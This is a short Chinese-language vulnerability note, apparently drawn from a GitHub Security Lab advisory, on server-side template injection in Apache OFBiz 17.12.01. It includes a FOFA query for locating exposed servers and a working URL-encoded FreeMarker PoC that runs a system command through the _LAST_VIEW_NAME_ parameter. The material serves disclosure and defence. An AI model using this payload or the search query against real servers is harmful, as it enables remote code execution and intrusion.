# Apache OfBiz 服务器端模板注入（SSTI）


Apache OfBiz 17.12.01容易受到服务器端模板注入（SSTI）的影响，从而导致远程代码执行（RCE）。

FOFA：

```
app="Apache_OFBiz"
```

服务器端模板注入 renderLookupField

从不可信数据流request.getParameter("`_LAST_VIEW_NAME_`")给一个FreeMarker的宏调用定义。具有特权以渲染任何包含查找字段的页面的攻击者将能够通过发送有效载荷来执行任意系统命令。

**PoC：**

```
https://localhost:8443/ordermgr/control/FindQuote?_LAST_VIEW_NAME_=%22%2F%3E%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%3CFOO
```

from:https://securitylab.github.com/advisories/GHSL-2020-067-apache_ofbiz